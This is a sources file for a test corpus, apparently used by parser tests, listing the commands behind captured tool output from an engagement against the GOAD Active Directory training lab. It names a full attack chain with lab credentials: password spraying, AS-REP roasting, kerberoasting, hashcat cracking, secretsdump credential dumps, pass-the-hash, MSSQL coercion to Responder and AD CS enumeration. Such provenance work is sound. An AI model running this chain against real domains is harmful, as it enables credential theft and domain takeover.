# GOAD corpus sources

`goad/` is one engagement against a GOAD lab (Game of Active Directory, a public training lab), grouped by tool. It comes from two runs against the same five hosts, plus four authored files. A new capture adds its files to a table here.

| Host | Name | Domain |
|---|---|---|
| 192.168.56.10 (`$DC01`) | kingslanding | sevenkingdoms.local |
| 192.168.56.11 (`$DC02`) | winterfell | north.sevenkingdoms.local |
| 192.168.56.12 (`$DC03`) | meereen | essos.local |
| 192.168.56.22 (`$SRV02`) | castelblack | north.sevenkingdoms.local (IIS, MSSQL) |
| 192.168.56.23 (`$SRV03`) | braavos | essos.local (MSSQL, AD CS) |

## Run 1 (2026-09-04)

nmap 7.80, NetExec 1.5.1, Impacket, hashcat, bloodhound-ce-python. Commands are reconstructed from shell history, so they are representative rather than exact. Files are as captured, except that a home path was removed from the nmap command line in `scans/goad-full.*` and `scans/hostsweep.*`.

| File | Command |
|---|---|
| `scans/hostsweep.{nmap,gnmap,xml}` | `nmap -sn 192.168.56.0/24 -oA scans/hostsweep` |
| `scans/goad-full.{nmap,gnmap,xml}` | `nmap -Pn -sV -sC -p- --min-rate 2000 <5 hosts> -oA scans/goad-full` |
| `nxc/nxc-smb-sweep.txt` | `netexec smb <5 hosts>` |
| `nxc/nxc-ldap.txt` | `netexec ldap $DC01 $DC02 $DC03` |
| `nxc/nxc-mssql.txt` | `netexec mssql $SRV02 $SRV03` |
| `nxc/nxc-winrm.txt` | `netexec winrm <5 hosts>` |
| `nxc/nxc-shares-dc01.txt` | `netexec smb $DC01 -u '' -p '' --shares` (access denied) |
| `nxc/nxc-shares-srv02.txt` | `netexec smb $SRV02 -u guest -p '' --shares` |
| `nxc/password-policy.txt` | `netexec smb $DC02 -u rickon.stark -p 'Winter2022' --pass-pol` |
| `nxc/nxc-kerb-north.txt` | `netexec ldap $DC02 -u rickon.stark -p 'Winter2022' --kerberoasting roast/kerb_north.txt` |
| `nxc/nxc-kerb-essos.txt` | `netexec ldap $DC03 -u missandei -p 'fr3edom' --kerberoasting roast/kerb_essos.txt` |
| `nxc/nxc-cred-check.txt` | `netexec smb <5 hosts> -u rickon.stark -p 'Winter2022'` |
| `nxc/nxc-loggedon.txt` | `netexec smb 192.168.56.0/24 -u <user> -p <pass> --loggedon-users` |
| `nxc/nxc-winrm-check.txt` | `netexec winrm $SRV02 -u rickon.stark -p 'Winter2022'` (denied) |
| `nxc/spray-hits.txt` | `netexec smb <DC> -u users.txt -p 'Winter2022' --continue-on-success \| tee -a`, per DC |
| `roast/asrep_7k.txt` | `GetNPUsers.py sevenkingdoms.local/ -usersfile users.txt -dc-ip $DC01 -no-pass -format hashcat -outputfile …` (empty: no hits) |
| `roast/asrep_north.txt`, `roast/asrep_essos.txt` | the same against north ($DC02) and essos ($DC03) |
| `roast/kerb_north.txt`, `roast/kerb_essos.txt` | written by the two `--kerberoasting` runs above |
| `crack/goad_seed.txt` | a hand-written wordlist, input to hashcat |
| `crack/asrep_cracked.txt` | `hashcat -m 18200 roast/asrep_north.txt rockyou.txt --outfile …` (also essos) |
| `crack/kerb_cracked.txt` | `hashcat -m 19700 roast/kerb_<domain>.txt crack/goad_seed.txt --outfile …` |
| `notes/creds.txt` | a hand-written note |
| `bloodhound/north_20260904205950_bloodhound.zip` | `bloodhound-ce-python -d north.sevenkingdoms.local -u rickon.stark -p 'Winter2022' -ns $DC02 -c All --zip` |
| `bloodhound/essos_20260904210044_bloodhound.zip` | `bloodhound-ce-python -d essos.local -u missandei -p 'fr3edom' -ns $DC03 -c All --zip` |

## Authored files

Written by hand in the tool's exact line format, using only hosts, accounts and passwords from run 1. They complete the chain AS-REP roast → crack → missandei logs in → kerberoast essos → crack → sql_svc is admin on braavos → dump → crack.

| File | Stands for |
|---|---|
| `nxc/nxc-cred-check-missandei.txt` | `netexec smb <5 hosts> -u missandei -p 'fr3edom'`: works on meereen and braavos |
| `nxc/nxc-cred-check-sql_svc.txt` | `netexec smb $DC03 $SRV03 -u sql_svc -p <cracked>`: admin on braavos (`Pwn3d!`) |
| `dumps/secretsdump-braavos.txt` | `secretsdump.py essos.local/sql_svc@$SRV03`; NT hashes computed from their passwords, Administrator's random |
| `crack/hashcat-braavos-ntlm.potfile` | `hashcat -m 1000` over those hashes; cracks `vagrant` |

## Run 2 (2026-10-19)

nmap 7.80, NetExec 1.5.1+1108 (NetBIOS names print lower case), Impacket 0.13.1, hashcat 6.2.5, Responder `424fbe5`, bloodhound-ce-python, certipy 4.8.2. Commands are quoted from a log of the run.

Values specific to this deployment were replaced with invented ones, the same way in every file: the `goadmin` password and its NT hash (recomputed), the krbtgt, machine, trust and `WDAGUtilityAccount` hashes, machine Kerberos keys and `plain_password_hex`, DPAPI keys, bootKey and NL$KM, domain SIDs, CA serial numbers, and the capture box's home directory and host name. GOAD's public default passwords and the hashes made from them are kept.

Facts the corpus tests rely on: RID 500 on castelblack and in north is `goadmin` (`Administrator` is RID 1009); the spray's user list came from the lab config; the Responder captures came from MSSQL coercion, not poisoning.

| File | Command |
|---|---|
| `scans/sweep.xml` | `nmap -sn 192.168.56.0/24 -oA …/sweep` |
| `scans/full.gnmap` | `nmap -sC -sV -p- --min-rate 2000 -oA …/full <5 hosts>` |
| `nxc/smb-sweep.txt` | `netexec smb 192.168.56.0/24` (Responder's SMB server answers too) |
| `nxc/pass-pol.txt` | `netexec smb $DC02 -u brandon.stark -p 'iseedeadpeople' --pass-pol` |
| `nxc/spray-north.txt` | `netexec smb $DC02 -u <user list> -p 'iseedeadpeople' --continue-on-success` |
| `nxc/users-north.txt` | `netexec smb $DC02 -u brandon.stark -p 'iseedeadpeople' --users` |
| `nxc/guest-shares.txt` | `netexec smb <5 hosts> -u guest -p '' --shares` |
| `nxc/check-brandon.stark.txt`, `nxc/shares-brandon.stark.txt` | `netexec smb <5 hosts> -u brandon.stark -p 'iseedeadpeople'`, then with `--shares` |
| `nxc/kerb-north-screen.txt`, `roast/kerb-north.txt` | `netexec ldap $DC02 -u brandon.stark -p 'iseedeadpeople' --kerberoasting roast/kerb-north.txt` |
| `roast/asrep-north.txt`, `roast/asrep-north-screen.txt` | `GetNPUsers.py north.sevenkingdoms.local/ -usersfile <user list> -no-pass -dc-ip $DC02 -format hashcat -outputfile …` |
| `roast/spns-north-screen.txt` | `GetUserSPNs.py -request -dc-ip $DC02 north.sevenkingdoms.local/brandon.stark:… -outputfile …` (every request failed `KDC_ERR_ETYPE_NOSUPP`) |
| `crack/hashcat.potfile` | the default potfile after `hashcat -m 18200` and `-m 19700` on the two roast files |
| `crack/kerb-north-show.txt` | `hashcat -m 19700 roast/kerb-north.txt --show` |
| `nxc/check-sql_svc.txt` | `netexec smb <5 hosts> -u sql_svc -p 'YouWillNotKerboroast1ngMeeeeee'` |
| `nxc/mssql-sql_svc.txt` | `netexec mssql $SRV02 $SRV03 -u sql_svc -p …` |
| `dumps/secretsdump-castelblack.txt` | `secretsdump.py 'north.sevenkingdoms.local/goadmin:Wildf1re-Kn0ws@192.168.56.22'` |
| `nxc/ntds-north.txt`, `nxc/nxc-logs/ntds/…` | `netexec smb $DC02 -u goadmin -p 'Wildf1re-Kn0ws' -d north.sevenkingdoms.local --ntds`, with the `~/.nxc/logs` file it wrote |
| `dumps/sd-winterfell.ntds` | `secretsdump.py 'north.sevenkingdoms.local/goadmin:Wildf1re-Kn0ws@192.168.56.11' -just-dc -outputfile …` |
| `nxc/dump-members-goadmin.txt`, `nxc/nxc-logs/sam/…`, `nxc/nxc-logs/lsa/…` | `netexec smb $SRV02 $SRV03 -u goadmin -p 'Wildf1re-Kn0ws' -d north.sevenkingdoms.local --sam --lsa`, with the files it wrote |
| `nxc/loggedon.txt` | `netexec smb <5 hosts> -u goadmin -p 'Wildf1re-Kn0ws' -d north.sevenkingdoms.local --loggedon-users` |
| `nxc/pth-local-admin.txt` | `netexec smb <5 hosts> -u goadmin -H '<NT hash>' --local-auth` |
| `responder/coerce-module.txt` | `netexec mssql $SRV02 -u sql_svc -p … -M mssql_coerce -o LISTENER=<jumpbox>` |
| `responder/logs/Responder-Session.log` | `Responder.py -I eth0 -v`, running during the coercion |
| `bloodhound/20261019141655_bloodhound.zip` | `bloodhound-ce-python -d north.sevenkingdoms.local -u brandon.stark -p 'iseedeadpeople' -ns $DC02 -c All --zip` |
| `adcs/certipy-north_Certipy.json`, `adcs/certipy-north_Certipy.txt` | `certipy find -u brandon.stark@north.sevenkingdoms.local -p … -dc-ip $DC02 -json -output …`, then with `-text` |
| `adcs/certipy-essos_Certipy.json` | `certipy find -u sql_svc@essos.local -p … -dc-ip $DC03 -json -output …` |
| `adcs/certipy-essos-vulnerable.txt` | `certipy find -u sql_svc@essos.local -p … -dc-ip $DC03 -vulnerable -stdout` |

Netexec and Impacket screen output was saved with `--no-progress | tee`. Five more files from this run test one parser each and live in `tests/fixtures/`; `tests/SOURCES.md` lists them.
